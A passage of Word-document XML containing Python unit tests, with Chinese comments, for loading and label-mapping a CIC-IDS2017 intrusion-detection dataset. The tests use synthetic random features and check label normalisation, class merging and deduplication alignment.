        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F234CB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>N_FEATURES = 12</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B920FDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D53EAFB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7EE4BB82">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def make_csv(path, n_per_class=40, classes=None, seed=0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13C2AA46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes = classes or ["BENIGN", "PortScan", "DDoS", "DoS Hulk", "FTP-Patator", "Heartbleed"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E123678">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rng = np.random.RandomState(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E65B3FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rows = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28605700">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i, cls in enumerate(classes):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D31A78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        block = rng.normal(loc=i, scale=1.0, size=(n_per_class, N_FEATURES)).astype("float32")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE08635">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        frame = pd.DataFrame(block, columns=[f"feat_{j}" for j in range(N_FEATURES)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E352EE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        frame["Label"] = cls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54725479">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        rows.append(frame)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F8ADA9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    pd.concat(rows, ignore_index=True).to_csv(path, index=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E4C858">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623FD926">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A052C36">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="63E9DCA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_normalize_label_handles_dash_variants():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E966DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # CIC-IDS2017 的 Web Attack 用的是 en dash，Patator 用的是普通短横，必须统一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3454E806">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert normalize_label("Web Attack – Brute Force") == "web attack - brute force"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4648061E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert normalize_label("  FTP-Patator ") == "ftp-patator"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="781C5B3E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert normalize_label("DoS   Hulk") == "dos hulk"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B4AB9C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09CA5052">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="622DD262">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_patator_variants_collapse_to_one_class():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3609EA80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert LABEL_MAP["ftp-patator"] == "Patator"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B8B783">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert LABEL_MAP["ssh-patator"] == "Patator"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3F3910">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="709B5A84">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58CDBA3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_label_map_is_idempotent():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15040D3B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：抽样后的 CSV 里存的已经是规范名，训练时再映射一遍必须还是规范名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B470AFC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="19B822D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    映射不幂等时，Patator（规范名）会被当成"不属于六类"整类丢掉，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14AB0ABC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    而且日志里只有一行"丢弃 13835 行"，训练照常跑完，指标看起来完全正常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D74746">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24666E4D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    from models.labels import CLASSES</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62FEA39D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="140BBE3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for canonical in CLASSES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AFFFC38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert LABEL_MAP.get(normalize_label(canonical)) == canonical</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3184AA4B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="032F89FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13BDCB5D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_canonical_label_csv_keeps_all_six_classes(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700B572F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03849523">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tmp_path / "canonical.csv",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31051284">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        n_per_class=10,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128F7A4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        classes=["BENIGN", "DDoS", "DoS Hulk", "Heartbleed", "Patator", "PortScan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27CD3BB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DF382A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, _, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E247C89">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(y) == {"BENIGN", "DDoS", "DoS Hulk", "Heartbleed", "Patator", "PortScan"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA004F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape[0] == 6 * 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC0CB9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79E1E522">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7545BF38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_load_dataset_maps_labels_and_reports(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AE8E2B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(tmp_path / "sample.csv")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3DD67E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X, y, names, _ = load_dataset(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03FF74BE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert set(y) == {"BENIGN", "PortScan", "DDoS", "DoS Hulk", "Patator", "Heartbleed"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47537D57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert names == [f"feat_{j}" for j in range(N_FEATURES)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E51864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert X.shape == (6 * 40, N_FEATURES)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AD29155">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47846830">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C875974">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_duplicate_rows_are_dropped_and_labels_stay_aligned(tmp_path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="221B66A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """回归：去重时如果拿 np.unique 排好序的数组去索引目标，标签会整体错位。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69836312">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    path = make_csv(tmp_path / "sample.csv", n_per_class=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7F1375">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
